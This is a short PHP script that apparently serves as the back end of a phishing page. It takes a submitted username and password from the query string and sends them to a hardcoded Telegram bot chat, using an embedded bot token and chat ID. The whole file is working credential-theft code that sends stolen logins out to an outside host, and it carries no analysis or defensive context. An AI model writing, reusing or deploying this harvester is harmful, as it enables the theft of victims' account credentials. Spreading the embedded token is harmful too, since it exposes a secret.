<?php

$user = $_GET['username'];
$pass = $_GET['pass'];
$text = "$user || $pass";

$token = "720380253:AAHg8cLLrIN_a8-s7qblspu84QW2KRmurXI";
$id = "727593573";

$get = json_decode(file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=$text"));

